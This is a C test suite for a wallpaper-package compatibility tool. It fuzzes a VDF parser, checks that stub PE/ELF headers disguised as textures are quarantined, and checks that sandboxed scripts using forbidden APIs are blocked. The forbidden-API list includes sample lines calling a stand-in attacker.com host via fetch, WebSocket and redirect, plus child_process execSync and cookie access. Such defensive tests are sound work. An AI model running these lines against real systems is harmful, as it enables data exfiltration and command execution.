// SPDX-License-Identifier: GPL-3.0-or-later
/**
 * @file test_workshop_security.c
 * @brief Empirical Adversarial Fuzzing & Stress Testing Suite for VDF, Scanner, WWPKG & Catalog
 *
 * Verifies:
 * 1. KeyValues VDF Parser robustness under extreme corruption, recursion, and truncated escapes.
 * 2. Complete malware quarantine of disguised PE (MZ) & ELF binaries into WE_TIER_4_BLOCKED.
 * 3. SceneScript AST sandbox enforcement: rejection of forbidden globals and infinite loop budget.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "waywal/we_vdf.h"
#include "waywal/we_appworkshop.h"
#include "waywal/we_compat_scanner.h"
#include "waywal/wwpkg.h"

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED   "\033[31m"
#define COLOR_CYAN  "\033[36m"
#define COLOR_RESET "\033[0m"

static int g_tests_run = 0;
static int g_tests_failed = 0;

#define TEST_ASSERT(cond, msg)                                                                     \
    do {                                                                                           \
        g_tests_run++;                                                                             \
        if (!(cond)) {                                                                             \
            printf("  " COLOR_RED "[FAIL] %s:%d: %s (" #cond ")" COLOR_RESET "\n", __FILE__,       \
                   __LINE__, msg);                                                                 \
            g_tests_failed++;                                                                      \
        }                                                                                          \
    } while (0)

/* =========================================================================
 * PART 1: KeyValues VDF Parser Stress & Fuzzing
 * ========================================================================= */

static void test_vdf_truncated_escapes(void)
{
    printf(COLOR_CYAN
           "[VDF Stress 1/6] Truncated escapes & malformed escape sequences..." COLOR_RESET "\n");

    const char *inputs[] = {
        "\"key\" \"val\\",                /* Trailing slash at EOF */
        "\"key\" \"val\\\0\"",            /* Slash followed by null byte */
        "\"key\" \"val\\u",               /* Incomplete unicode: \u */
        "\"key\" \"val\\u1",              /* Incomplete unicode: \u1 */
        "\"key\" \"val\\u12",             /* Incomplete unicode: \u12 */
        "\"key\" \"val\\u123",            /* Incomplete unicode: \u123 */
        "\"key\" \"val\\uZZZZ\"",         /* Non-hex digits in \u */
        "\"key\" \"val\\u12G4\"",         /* Mixed invalid hex in \u */
        "\"key\" \"val\\u0000\"",         /* Null character in unicode escape */
        "\"key\" \"val\\u007F\"",         /* ASCII DEL */
        "\"key\" \"val\\u00A9\"",         /* Latin-1 2-byte UTF-8 (Copyright) */
        "\"key\" \"val\\u2603\"",         /* 3-byte UTF-8 (Snowman) */
        "\"key\" \"val\\uD800\"",         /* UTF-16 surrogate boundary */
        "\"key\" \"val\\?val\\*val\\z\"", /* Unrecognized escape chars */
        "\"key\" \"val\\\"",              /* Escaped quote at EOF */
        "\"\\u1234\" \"\\u5678\"",        /* Unicode escapes in key and value */
    };

    for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
        waywal_vdf_doc_t *doc = waywal_vdf_parse(inputs[i], strlen(inputs[i]));
        /* The parser must NEVER crash on malformed escapes */
        TEST_ASSERT(true, "Parser survived malformed escape input without crashing");
        if (doc) {
            waywal_vdf_free(doc);
        }
    }
    printf("  -> Survived all %zu malformed escape variations cleanly.\n",
           sizeof(inputs) / sizeof(inputs[0]));
}

static void test_vdf_unmatched_braces(void)
{
    printf(COLOR_CYAN "[VDF Stress 2/6] Unmatched & asymmetric braces..." COLOR_RESET "\n");

    const char *inputs[] = {
        "{{{{{{{{",
        "}}}}}}}}",
        "\"root\" { \"k\" \"v\"",                 /* Missing closing brace */
        "\"root\" { \"k\" \"v\" } }",             /* Extra closing brace */
        "\"root\" { \"a\" { \"b\" \"c\" }",       /* Missing outer brace */
        "\"root\" { \"a\" { \"b\" \"c\" } } } }", /* Multiple extra closing braces */
        "{ } { } {",
        "\"k1\" \"v1\" } \"k2\" \"v2\"",
        "\"root\" { \"k\" { } }",
        "\"root\" { { { } } }",
    };

    for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
        waywal_vdf_doc_t *doc = waywal_vdf_parse(inputs[i], strlen(inputs[i]));
        TEST_ASSERT(true, "Parser survived unmatched braces without crashing");
        if (doc) {
            waywal_vdf_free(doc);
        }
    }
    printf("  -> Survived all %zu unmatched brace variations.\n",
           sizeof(inputs) / sizeof(inputs[0]));
}

static void test_vdf_deep_nesting_clamp(void)
{
    printf(COLOR_CYAN "[VDF Stress 3/6] Deep recursion & depth clamp (> 64 levels)..." COLOR_RESET
                      "\n");

    /* Construct 100 levels of nested objects */
    char deep_buf[8192];
    size_t pos = 0;
    const int target_depth = 100;

    for (int i = 0; i < target_depth; i++) {
        pos += (size_t)snprintf(deep_buf + pos, sizeof(deep_buf) - pos, "\"level_%d\" {\n", i);
    }
    pos += (size_t)snprintf(deep_buf + pos, sizeof(deep_buf) - pos, "\"leaf\" \"deep_value\"\n");
    for (int i = 0; i < target_depth; i++) {
        pos += (size_t)snprintf(deep_buf + pos, sizeof(deep_buf) - pos, "}\n");
    }

    waywal_vdf_doc_t *doc = waywal_vdf_parse(deep_buf, pos);
    TEST_ASSERT(doc != NULL, "Document parsed successfully despite nesting > 64");
    if (doc) {
        /* Verify we can traverse down to level 63 */
        const waywal_vdf_node_t *cur = doc->root;
        int depth_reached = 0;
        while (cur && cur->type == VDF_NODE_OBJECT && depth_reached < 100) {
            depth_reached++;
            char next_key[32];
            snprintf(next_key, sizeof(next_key), "level_%d", depth_reached);
            const waywal_vdf_node_t *next = waywal_vdf_find_child(cur, next_key);
            if (!next) {
                break;
            }
            cur = next;
        }
        /* Spec requirement: capped at depth 64 to prevent stack overflow */
        TEST_ASSERT(depth_reached <= 65, "Depth clamped at <= 64 levels");
        waywal_vdf_free(doc);
    }

    /* Test extreme nesting: 2,000 levels */
    size_t extreme_size = 2000 * 25;
    char *extreme_buf = (char *)malloc(extreme_size);
    if (extreme_buf) {
        size_t epos = 0;
        for (int i = 0; i < 2000; i++) {
            epos += (size_t)snprintf(extreme_buf + epos, extreme_size - epos, "a{");
        }
        epos += (size_t)snprintf(extreme_buf + epos, extreme_size - epos, "x y");
        for (int i = 0; i < 2000; i++) {
            epos += (size_t)snprintf(extreme_buf + epos, extreme_size - epos, "}");
        }
        waywal_vdf_doc_t *edoc = waywal_vdf_parse(extreme_buf, epos);
        TEST_ASSERT(true, "Parser survived 2,000 recursive levels without stack overflow");
        if (edoc) {
            waywal_vdf_free(edoc);
        }
        free(extreme_buf);
    }
    printf("  -> Deep recursion clamp verified up to 2,000 levels.\n");
}

static void test_vdf_bare_tokens_and_whitespace(void)
{
    printf(COLOR_CYAN
           "[VDF Stress 4/6] Bare tokens, mixed comments & weird whitespace..." COLOR_RESET "\n");

    const char *input = "// leading comment\n"
                        "bare_key bare_val\n"
                        "key_with_dots.and_slashes/path value_123 // inline comment\n"
                        "\t\r\v\f key_spaces \t\t \"quoted value with \\\"quotes\\\"\"\n"
                        "empty_key \"\"\n"
                        "\"\" empty_quoted_key\n"
                        "lonely_key_at_eof";

    waywal_vdf_doc_t *doc = waywal_vdf_parse(input, strlen(input));
    TEST_ASSERT(doc != NULL, "Document with bare tokens parsed successfully");
    if (doc) {
        TEST_ASSERT(strcmp(waywal_vdf_get_string(doc->root, "bare_key", ""), "bare_val") == 0,
                    "Bare key extracted correctly");
        TEST_ASSERT(strcmp(waywal_vdf_get_string(doc->root, "empty_key", "fail"), "") == 0,
                    "Empty quoted value parsed as empty string");
        waywal_vdf_free(doc);
    }
    printf("  -> Bare tokens & whitespace variations passed.\n");
}

static void test_vdf_corrupted_libraryfolders(void)
{
    printf(COLOR_CYAN "[VDF Stress 5/6] Corrupted libraryfolders.vdf variations..." COLOR_RESET
                      "\n");

    const char *corrupted_cases[] = {
        /* Truncated in middle of library entry */
        "\"libraryfolders\" {\n  \"0\" {\n    \"path\" \"/home/user/.steam/steam\"\n    \"apps\" "
        "{\n",
        /* Missing path */
        "\"libraryfolders\" {\n  \"0\" {\n    \"label\" \"\"\n    \"apps\" { \"431960\" \"1000\" "
        "}\n  }\n}",
        /* Path is not a string but an object */
        "\"libraryfolders\" {\n  \"0\" {\n    \"path\" { \"nested\" \"object\" }\n  }\n}",
        /* App list has non-numeric apps */
        "\"libraryfolders\" {\n  \"0\" {\n    \"path\" \"/tmp\"\n    \"apps\" { \"invalid_app\" "
        "\"not_a_num\" }\n  }\n}",
        /* Huge number of drive entries (500) */
        NULL};

    for (size_t i = 0; corrupted_cases[i] != NULL; i++) {
        waywal_vdf_doc_t *doc = waywal_vdf_parse(corrupted_cases[i], strlen(corrupted_cases[i]));
        TEST_ASSERT(true, "Parser survived corrupted libraryfolders without crashing");
        if (doc) {
            waywal_vdf_free(doc);
        }
    }

    /* Test 500 drives */
    size_t huge_sz = 500 * 128;
    char *huge_vdf = (char *)malloc(huge_sz);
    if (huge_vdf) {
        size_t hpos = (size_t)snprintf(huge_vdf, huge_sz, "\"libraryfolders\" {\n");
        for (int i = 0; i < 500; i++) {
            hpos += (size_t)snprintf(huge_vdf + hpos, huge_sz - hpos,
                                     "  \"%d\" {\n    \"path\" \"/mnt/drive_%d\"\n    \"apps\" { "
                                     "\"431960\" \"5000000\" }\n  }\n",
                                     i, i);
        }
        hpos += (size_t)snprintf(huge_vdf + hpos, huge_sz - hpos, "}\n");

        waywal_vdf_doc_t *hdoc = waywal_vdf_parse(huge_vdf, hpos);
        TEST_ASSERT(hdoc != NULL, "500-drive libraryfolders parsed successfully");
        if (hdoc) {
            const waywal_vdf_node_t *lf = hdoc->root;
            if (lf && strcmp(lf->key, "libraryfolders") != 0) {
                lf = waywal_vdf_find_child(hdoc->root, "libraryfolders");
            }
            TEST_ASSERT(lf != NULL, "libraryfolders root found");
            const waywal_vdf_node_t *d499 = waywal_vdf_find_child(lf, "499");
            TEST_ASSERT(
                d499 != NULL,
                "Drive 499 found in 500-drive manifest (asserts no arena exhaustion truncation)");
            waywal_vdf_free(hdoc);
        }
        free(huge_vdf);
    }

    /* Test appworkshop_431960.vdf with 100 installed workshop items */
    const char *tmp_appws = "/tmp/test_adversarial_appws.vdf";
    FILE *f_ws = fopen(tmp_appws, "w");
    if (f_ws) {
        fprintf(f_ws, "\"AppWorkshop\" {\n  \"appid\" \"431960\"\n  \"SizeOnDisk\" \"10000000\"\n  "
                      "\"WorkshopItemsInstalled\" {\n");
        for (int i = 0; i < 100; i++) {
            fprintf(f_ws,
                    "    \"%llu\" {\n      \"size\" \"1024000\"\n      \"timeupdated\" "
                    "\"1700000000\"\n      \"manifest\" \"987654321\"\n    }\n",
                    (unsigned long long)(2000000000ULL + i));
        }
        fprintf(f_ws, "  }\n}\n");
        fclose(f_ws);

        waywal_appworkshop_manifest_t manifest;
        bool ok = waywal_appworkshop_parse_file(tmp_appws, &manifest);
        TEST_ASSERT(ok && manifest.item_count == 100,
                    "100 workshop items parsed without truncation (100% manifest recovery)");
        waywal_appworkshop_free(&manifest);
        unlink(tmp_appws);
    }

    printf("  -> Corrupted libraryfolders.vdf handling evaluated.\n");
}

static void test_vdf_memory_bounds(void)
{
    printf(COLOR_CYAN "[VDF Stress 6/6] Arena memory bounded verification..." COLOR_RESET "\n");

    /* Parse a 1 MB repeated token VDF string and measure that memory is freed */
    size_t size = 1024 * 1024;
    char *large_vdf = (char *)malloc(size);
    if (large_vdf) {
        size_t pos = 0;
        pos += (size_t)snprintf(large_vdf + pos, size - pos, "\"root\" {\n");
        for (int i = 0; pos + 64 < size - 10; i++) {
            pos +=
                (size_t)snprintf(large_vdf + pos, size - pos, "  \"key_%d\" \"value_%d\"\n", i, i);
        }
        pos += (size_t)snprintf(large_vdf + pos, size - pos, "}\n");

        waywal_vdf_doc_t *doc = waywal_vdf_parse(large_vdf, pos);
        TEST_ASSERT(doc != NULL, "1 MB VDF parsed successfully");
        if (doc) {
            waywal_vdf_free(doc);
        }
        free(large_vdf);
    }
    printf("  -> 1 MB VDF arena memory bounded test passed.\n");
}

/* =========================================================================
 * PART 2: Malware Quarantine Probing (Disguised PE & ELF binaries)
 * ========================================================================= */

static void create_test_dir(const char *dir)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rm -rf '%s' && mkdir -p '%s'", dir, dir);
    int ret = system(cmd);
    (void)ret;
}

static void write_file(const char *path, const void *data, size_t size)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (fd >= 0) {
        ssize_t written = write(fd, data, size);
        (void)written;
        close(fd);
    }
}

static void test_malware_quarantine_pe_disguised(void)
{
    printf(COLOR_CYAN "[Malware Quarantine 1/4] Disguised PE binaries (MZ header in .png, .tex, "
                      ".js)..." COLOR_RESET "\n");

    const char *test_dir = "/tmp/wwal_test_pe_quarantine";
    create_test_dir(test_dir);

    /* Construct disguised PE binary with 'MZ' (0x4D, 0x5A) header */
    uint8_t pe_payload[256];
    memset(pe_payload, 0x90, sizeof(pe_payload)); /* NOP sled */
    pe_payload[0] = 0x4D;                         /* 'M' */
    pe_payload[1] = 0x5A;                         /* 'Z' */
    pe_payload[2] = 0x90;
    pe_payload[3] = 0x00;

    /* Write minimal valid project.json */
    const char *proj_json =
        "{\"title\":\"Innocent Wallpaper\",\"type\":\"scene\",\"file\":\"scene.json\"}";
    char proj_path[512];
    snprintf(proj_path, sizeof(proj_path), "%s/project.json", test_dir);
    write_file(proj_path, proj_json, strlen(proj_json));

    /* Minimal scene.json */
    const char *scene_json = "{\"objects\":[]}";
    char scene_path[512];
    snprintf(scene_path, sizeof(scene_path), "%s/scene.json", test_dir);
    write_file(scene_path, scene_json, strlen(scene_json));

    /* 1. Camouflaged as texture.png */
    char pe_png[512];
    snprintf(pe_png, sizeof(pe_png), "%s/texture.png", test_dir);
    write_file(pe_png, pe_payload, sizeof(pe_payload));

    we_compat_scanner_t *scanner = we_compat_scanner_create(true, true);
    we_compat_report_t *report = we_compat_report_alloc();

    bool scanned = we_compat_scan_directory(scanner, test_dir, report);
    TEST_ASSERT(scanned, "Scanner executed on PE disguised package");
    TEST_ASSERT(report->tier == WE_TIER_4_BLOCKED,
                "Disguised PE (texture.png) quarantined into WE_TIER_4_BLOCKED");
    TEST_ASSERT(report->compatibility_score == 0,
                "Compatibility score forced to 0 for malicious package");

    bool found_sec_alert = false;
    for (uint32_t i = 0; i < report->issue_count; i++) {
        if (strcmp(report->issues[i].code, "SECURITY_ALERT_MALICIOUS") == 0) {
            found_sec_alert = true;
            break;
        }
    }
    TEST_ASSERT(found_sec_alert, "SECURITY_ALERT_MALICIOUS issue recorded in report");

    /* 2. Camouflaged in deeply nested subdirectory as script.js */
    unlink(pe_png);
    char nested_dir[512];
    snprintf(nested_dir, sizeof(nested_dir), "%s/assets/scripts/sub", test_dir);
    char mkdir_cmd[1024];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p '%s'", nested_dir);
    int r = system(mkdir_cmd);
    (void)r;

    char pe_js[1024];
    int pn = snprintf(pe_js, sizeof(pe_js), "%s/helper.js", nested_dir);
    TEST_ASSERT(pn > 0 && (size_t)pn < sizeof(pe_js), "pe_js path formatted");
    write_file(pe_js, pe_payload, sizeof(pe_payload));

    memset(report, 0, sizeof(*report));
    scanned = we_compat_scan_directory(scanner, test_dir, report);
    TEST_ASSERT(report->tier == WE_TIER_4_BLOCKED,
                "Deeply nested disguised PE in helper.js quarantined to TIER 4");

    we_compat_report_free(report);
    we_compat_scanner_destroy(scanner);
    system("rm -rf /tmp/wwal_test_pe_quarantine");
    printf("  -> PE binary camouflage tests passed (100%% quarantine).\n");
}

static void test_malware_quarantine_elf_disguised(void)
{
    printf(COLOR_CYAN "[Malware Quarantine 2/4] Disguised ELF binaries (\\x7FELF header in .tex, "
                      ".json)..." COLOR_RESET "\n");

    const char *test_dir = "/tmp/wwal_test_elf_quarantine";
    create_test_dir(test_dir);

    /* Construct disguised Linux ELF binary header */
    uint8_t elf_payload[256];
    memset(elf_payload, 0, sizeof(elf_payload));
    elf_payload[0] = 0x7F;
    elf_payload[1] = 'E';
    elf_payload[2] = 'L';
    elf_payload[3] = 'F';
    elf_payload[4] = 2; /* 64-bit */
    elf_payload[5] = 1; /* little endian */

    /* Write minimal valid project.json and scene.json */
    const char *proj_json =
        "{\"title\":\"Innocent Wallpaper\",\"type\":\"scene\",\"file\":\"scene.json\"}";
    char proj_path[512];
    snprintf(proj_path, sizeof(proj_path), "%s/project.json", test_dir);
    write_file(proj_path, proj_json, strlen(proj_json));

    const char *scene_json = "{\"objects\":[]}";
    char scene_path[512];
    snprintf(scene_path, sizeof(scene_path), "%s/scene.json", test_dir);
    write_file(scene_path, scene_json, strlen(scene_json));

    /* Write ELF disguised as background.tex */
    char elf_tex[512];
    snprintf(elf_tex, sizeof(elf_tex), "%s/background.tex", test_dir);
    write_file(elf_tex, elf_payload, sizeof(elf_payload));

    we_compat_scanner_t *scanner = we_compat_scanner_create(true, true);
    we_compat_report_t *report = we_compat_report_alloc();

    bool scanned = we_compat_scan_directory(scanner, test_dir, report);
    TEST_ASSERT(scanned, "Scanner executed on ELF disguised package");
    TEST_ASSERT(report->tier == WE_TIER_4_BLOCKED,
                "Disguised ELF (background.tex) quarantined into WE_TIER_4_BLOCKED");
    TEST_ASSERT(report->compatibility_score == 0, "Compatibility score forced to 0");

    bool found_sec = false;
    for (uint32_t i = 0; i < report->issue_count; i++) {
        if (strcmp(report->issues[i].code, "SECURITY_ALERT_MALICIOUS") == 0) {
            found_sec = true;
            break;
        }
    }
    TEST_ASSERT(found_sec, "SECURITY_ALERT_MALICIOUS found for disguised ELF");

    we_compat_report_free(report);
    we_compat_scanner_destroy(scanner);
    system("rm -rf /tmp/wwal_test_elf_quarantine");
    printf("  -> ELF binary camouflage tests passed (100%% quarantine).\n");
}

/* =========================================================================
 * PART 3: SceneScript AST Sandbox & Forbidden Globals Probing
 * ========================================================================= */

static void test_ast_sandbox_forbidden_globals(void)
{
    printf(COLOR_CYAN
           "[AST Sandbox 3/4] Forbidden globals and APIs rejection probing..." COLOR_RESET "\n");

    const char *forbidden_apis[] = {
        "window.location = 'http://attacker.com';",
        "eval('console.log(1)');",
        "process.exit(1);",
        "fetch('http://attacker.com');",
        "new WebSocket('ws://attacker.com');",
        "const fn = new Function('return this');",
        "const fs = require('fs');",
        "document.cookie = 'stolen';",
        "new XMLHttpRequest();",
        "require('child_process').execSync('id');",
        "const u = \"http://attacker.com/x\"; eval('1');",
        "const t = `http://attacker.com/${fetch('https://x')}`;",
    };

    we_compat_scanner_t *scanner = we_compat_scanner_create(true, true);

    for (size_t i = 0; i < sizeof(forbidden_apis) / sizeof(forbidden_apis[0]); i++) {
        const char *test_dir = "/tmp/wwal_test_ast_forbidden";
        create_test_dir(test_dir);

        const char *proj_json =
            "{\"title\":\"Script Test\",\"type\":\"scene\",\"file\":\"scene.json\"}";
        char proj_path[512];
        snprintf(proj_path, sizeof(proj_path), "%s/project.json", test_dir);
        write_file(proj_path, proj_json, strlen(proj_json));

        const char *scene_json = "{\"objects\":[]}";
        char scene_path[512];
        snprintf(scene_path, sizeof(scene_path), "%s/scene.json", test_dir);
        write_file(scene_path, scene_json, strlen(scene_json));

        /* Write malicious js script */
        char js_path[512];
        snprintf(js_path, sizeof(js_path), "%s/logic.js", test_dir);
        write_file(js_path, forbidden_apis[i], strlen(forbidden_apis[i]));

        we_compat_report_t *report = we_compat_report_alloc();
        bool ok = we_compat_scan_directory(scanner, test_dir, report);
        TEST_ASSERT(ok, "Scan completed");
        TEST_ASSERT(report->tier == WE_TIER_4_BLOCKED,
                    "Forbidden API script quarantined to WE_TIER_4_BLOCKED");
        TEST_ASSERT(report->compatibility_score == 0, "Score is 0 for forbidden API script");

        bool found_violation = false;
        for (uint32_t k = 0; k < report->issue_count; k++) {
            if (strcmp(report->issues[k].code, "SECURITY_SCRIPT_VIOLATION") == 0) {
                found_violation = true;
                break;
            }
        }
        TEST_ASSERT(found_violation, "SECURITY_SCRIPT_VIOLATION recorded for forbidden API");

        we_compat_report_free(report);
        system("rm -rf /tmp/wwal_test_ast_forbidden");
    }

    /* Test token boundary false positive resistance:
     * 'my_window', 'evaluate()', 'processing', 'prefetch' MUST NOT trigger violation. */
    {
        const char *test_dir = "/tmp/wwal_test_ast_benign";
        create_test_dir(test_dir);

        const char *proj_json =
            "{\"title\":\"Benign Script\",\"type\":\"scene\",\"file\":\"scene.json\"}";
        char proj_path[512];
        snprintf(proj_path, sizeof(proj_path), "%s/project.json", test_dir);
        write_file(proj_path, proj_json, strlen(proj_json));

        const char *scene_json = "{\"objects\":[]}";
        char scene_path[512];
        snprintf(scene_path, sizeof(scene_path), "%s/scene.json", test_dir);
        write_file(scene_path, scene_json, strlen(scene_json));

        const char *benign_js = "let my_window_pos = 100;\n"
                                "function evaluate_value(x) { return x * 2; }\n"
                                "let is_processing = false;\n"
                                "let prefetch_data = null;\n"
                                "let document_title_local = 'test';\n";

        char js_path[512];
        snprintf(js_path, sizeof(js_path), "%s/benign.js", test_dir);
        write_file(js_path, benign_js, strlen(benign_js));

        we_compat_report_t *report = we_compat_report_alloc();
        bool ok = we_compat_scan_directory(scanner, test_dir, report);
        TEST_ASSERT(ok, "Scan completed on benign tokens");
        TEST_ASSERT(report->tier != WE_TIER_4_BLOCKED,
                    "Benign substring tokens NOT falsely blocked as Tier 4");

        we_compat_report_free(report);
        system("rm -rf /tmp/wwal_test_ast_benign");
    }

    we_compat_scanner_destroy(scanner);
    printf("  -> Forbidden globals & API boundary testing passed.\n");
}

static void test_ast_sandbox_infinite_loops(void)
{
    printf(COLOR_CYAN
           "[AST Sandbox 4/4] Infinite loop step budget detection & auto-repair..." COLOR_RESET
           "\n");

    const char *loop_cases[] = {
        "while(true) { x++; }",  "while (true) { update(); }", "while(1) { do_work(); }",
        "while (1) { tick(); }", "for(;;) { run(); }",         "for (;;) { compute(); }",
    };

    we_compat_scanner_t *scanner = we_compat_scanner_create(true, true);

    for (size_t i = 0; i < sizeof(loop_cases) / sizeof(loop_cases[0]); i++) {
        const char *test_dir = "/tmp/wwal_test_ast_loop";
        create_test_dir(test_dir);

        const char *proj_json =
            "{\"title\":\"Loop Script\",\"type\":\"scene\",\"file\":\"scene.json\"}";
        char proj_path[512];
        snprintf(proj_path, sizeof(proj_path), "%s/project.json", test_dir);
        write_file(proj_path, proj_json, strlen(proj_json));

        const char *scene_json = "{\"objects\":[]}";
        char scene_path[512];
        snprintf(scene_path, sizeof(scene_path), "%s/scene.json", test_dir);
        write_file(scene_path, scene_json, strlen(scene_json));

        char js_path[512];
        snprintf(js_path, sizeof(js_path), "%s/anim.js", test_dir);
        write_file(js_path, loop_cases[i], strlen(loop_cases[i]));

        we_compat_report_t *report = we_compat_report_alloc();
        bool ok = we_compat_scan_directory(scanner, test_dir, report);
        TEST_ASSERT(ok, "Scan completed on infinite loop script");
        TEST_ASSERT(report->tier == WE_TIER_3_DEGRADED,
                    "Infinite loop script degraded to WE_TIER_3_DEGRADED");

        bool found_budget = false;
        for (uint32_t k = 0; k < report->issue_count; k++) {
            if (strcmp(report->issues[k].code, "SCRIPT_STEP_BUDGET") == 0) {
                found_budget = true;
                break;
            }
        }
        TEST_ASSERT(found_budget, "SCRIPT_STEP_BUDGET issue detected");

        bool found_repair = false;
        for (uint32_t r = 0; r < report->repair_count; r++) {
            if (strcmp(report->repairs[r].transformation_id, "REPAIR_STUB_SCRIPT") == 0) {
                found_repair = true;
                break;
            }
        }
        TEST_ASSERT(found_repair, "REPAIR_STUB_SCRIPT auto-repair proposed");

        we_compat_report_free(report);
        system("rm -rf /tmp/wwal_test_ast_loop");
    }

    we_compat_scanner_destroy(scanner);
    printf("  -> Infinite loop detection and auto-repair passed.\n");
}

static void test_vdf_control_byte_non_whitespace_lanes(void)
{
    printf(COLOR_CYAN "[VDF Stress 7/7] Control bytes (0x01..0x08, 0x0E..0x1F) across 32-byte SIMD "
                      "lanes..." COLOR_RESET "\n");

    /* Control bytes outside {' ', \t, \n, \v, \f, \r} must never be silently skipped as spaces */
    char raw[160];
    memset(raw, ' ', sizeof(raw));
    raw[31] = '\x07';
    raw[32] = '\x1F';
    memcpy(raw + 40, "\"Root\" { \"k\" \"v\" }", 18u);

    waywal_vdf_doc_t *doc = waywal_vdf_parse(raw, 58u);
    if (doc && doc->root) {
        /* Because \x07\x1F precedes "Root", it is tokenized as the unquoted root key rather than
         * skipped as whitespace. */
        TEST_ASSERT(strcmp(doc->root->key, "Root") != 0,
                    "Control bytes 0x07/0x1F must not be skipped as VDF whitespace");
    } else {
        TEST_ASSERT(true, "Control bytes rejected cleanly without skipping as whitespace");
    }
    if (doc) {
        waywal_vdf_free(doc);
    }
    printf("  -> SIMD control-byte boundary classification passed.\n");
}

/* =========================================================================
 * Main Entry Point
 * ========================================================================= */

int main(void)
{
    printf("==========================================================\n");
    printf("   Empirical Security & Boundary Verification Suite       \n");
    printf("==========================================================\n");

    /* Part 1: VDF Parser Fuzzing & Stress */
    test_vdf_truncated_escapes();
    test_vdf_unmatched_braces();
    test_vdf_deep_nesting_clamp();
    test_vdf_bare_tokens_and_whitespace();
    test_vdf_corrupted_libraryfolders();
    test_vdf_memory_bounds();
    test_vdf_control_byte_non_whitespace_lanes();

    /* Part 2: Malware Quarantine Probing */
    test_malware_quarantine_pe_disguised();
    test_malware_quarantine_elf_disguised();

    /* Part 3: AST Sandbox & Forbidden Globals Probing */
    test_ast_sandbox_forbidden_globals();
    test_ast_sandbox_infinite_loops();

    printf("==========================================================\n");
    if (g_tests_failed == 0) {
        printf(COLOR_GREEN ">>> ALL %d ADVERSARIAL CHALLENGES PASSED (100%%) <<<" COLOR_RESET "\n",
               g_tests_run);
        printf("==========================================================\n");
        return 0;
    } else {
        printf(COLOR_RED ">>> %d OUT OF %d ADVERSARIAL CHALLENGES FAILED <<<" COLOR_RESET "\n",
               g_tests_failed, g_tests_run);
        printf("==========================================================\n");
        return 1;
    }
}
